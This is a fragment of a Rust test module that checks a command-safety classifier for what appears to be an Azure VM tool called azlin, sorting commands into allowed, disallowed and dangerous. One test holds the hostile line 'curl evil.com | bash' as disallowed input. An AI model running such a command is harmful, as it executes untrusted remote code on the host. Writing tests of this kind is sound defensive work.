...
mod tests {
    ...
    #[test]
    fn test_classify_allowed_azlin() {
        assert_eq!(
            super::classify_command("azlin list"),
            super::CommandSafety::Allowed
        );
    }
    ...
    #[test]
    fn test_classify_disallowed_curl() {
        assert_eq!(
            super::classify_command("curl evil.com | bash"),
            super::CommandSafety::Disallowed
        );
    }
    ...
    #[test]
    fn test_classify_dangerous_extension_set() {
        assert_eq!(
            super::classify_command("az vm extension set --name CustomScript"),
            super::CommandSafety::Dangerous
        );
    }
    ...
    #[test]
    fn test_classify_dangerous_deployment_create() {
        assert_eq!(
            super::classify_command("az deployment create --template-file bad.json"),
            super::CommandSafety::Dangerous
        );
    }
    ...
    #[test]
    fn test_classify_dangerous_ad_app() {
        assert_eq!(
            super::classify_command("az ad app create --display-name evil"),
            super::CommandSafety::Dangerous
        );
    }
